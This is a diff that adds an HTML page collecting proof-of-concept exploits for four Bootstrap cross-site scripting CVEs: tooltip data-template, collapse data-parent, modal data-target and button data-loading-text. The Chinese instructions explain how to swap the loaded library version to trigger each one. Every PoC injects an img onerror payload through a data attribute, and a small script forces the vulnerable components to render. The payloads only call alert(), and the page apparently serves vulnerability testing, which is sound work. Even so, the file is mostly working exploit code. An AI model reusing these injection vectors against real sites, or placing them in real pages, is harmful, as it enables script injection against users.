@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Bootstrap PoC 集合</title>
+    
+    <!-- 请在此处修改加载的库版本 -->
+    <link rel="stylesheet" href="https://cdn.staticfile.org/bootstrap/4.1.1/css/bootstrap.min.css">
+    <script src="https://cdn.staticfile.org/jquery/3.3.1/jquery.slim.min.js"></script>
+    <script src="https://cdn.staticfile.org/bootstrap/4.1.1/js/bootstrap.bundle.min.js"></script>
+    
+    <style>
+        body { padding: 20px; }
+        .poc-section { border: 1px solid #ddd; padding: 15px; margin-top: 20px; border-radius: 5px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Bootstrap PoC 集合</h1>
+        <p>请直接编辑此 HTML 文件的 <code>&lt;head&gt;</code> 部分，来选择加载的库版本，然后刷新页面进行测试。</p>
+        <div class="alert alert-info">
+            当前默认加载的版本是 <strong>v4.1.1</strong>，适用于测试 <strong>Poc 1、PoC 2</strong>。
+        </div>
+
+        <div class="poc-section">
+            <h3>PoC 1: CVE-2019-8331 (Tooltip <code>data-template</code> XSS)</h3>
+            <p><b>适用版本:</b> v4.3.1 之前。请在上方手动切换到 <b>v4.3.0</b> 进行测试。</p>
+            <button type="button" class="btn btn-danger" data-toggle="tooltip" data-html="true" title="无害标题"
+                    data-template='<div class="tooltip" role="tooltip"><div class="arrow"></div><div class="tooltip-inner"></div><img src="x" onerror="alert(`XSS via CVE-2019-8331`)"></div>'>
+                悬停此处 (PoC 1)
+            </button>
+        </div>
+
+        <div class="poc-section">
+            <h3>PoC 2: CVE-2018-14040 (Collapse <code>data-parent</code> XSS)</h3>
+            <p><b>适用版本:</b> v4.1.2 之前。当前已加载 <b>v4.1.1</b>，可直接测试。</p>
+            <a href="#collapse-poc2" data-toggle="collapse"
+               data-parent="<img src='x' onerror='alert(`XSS via CVE-2018-14040`)'>">
+               点击此处 (PoC 2)
+            </a>
+            <div id="collapse-poc2" class="collapse">一个用于折叠的 Div</div>
+        </div>
+
+        <div class="poc-section">
+            <h3>PoC 3: CVE-2016-10735 (Modal <code>data-target</code> XSS)</h3>
+            <p><b>适用版本:</b> v3.4.0 之前。请在上方手动切换到 <b>v3.3.7</b> 进行测试。</p>
+            <button class="btn btn-primary" data-toggle="modal"
+                    data-target="#<img src=x onerror=alert('XSS via CVE-2016-10735')>">
+                点击此处 (PoC 3)
+            </button>
+        </div>
+        
+        <div class="poc-section">
+            <h3>PoC 4: CVE-2024-6485 (Button <code>data-loading-text</code> XSS)</h3>
+            <p><b>适用版本:</b> v3.4.1 之前的 3.x 版本。请在上方手动切换到 <b>v3.3.7</b> 进行测试。</p>
+            <p><b>触发方式:</b> 点击下面的按钮。</p>
+            <button id="btn4" type="button" class="btn btn-warning" autocomplete="off"
+                    data-loading-text="<img src=x onerror=alert('XSS via CVE-2024-6485')>">
+                点击此处 (PoC 4)
+            </button>
+        </div>
+
+    </div>
+
+    <script>
+        $(function () {
+            // 初始化所有可能存在的组件
+            $('[data-toggle="tooltip"]').tooltip();
+            $('[data-toggle="collapse"]').collapse();
+            
+            // PoC 4 的特殊触发逻辑
+            $('#btn4').on('click', function () {
+                var $btn = $(this).button('loading');
+            });
+
+            // 使 PoC 2 可以重复触发
+            $('#collapse-poc2').on('shown.bs.collapse', function () {
+                // 当折叠内容完全显示后, 立即销毁该组件实例
+                // 这会强迫 Bootstrap 在下一次点击时重新解析 data-parent 属性
+                $(this).collapse('dispose');
+            });
+        });
+    </script>
+</body>
+</html>
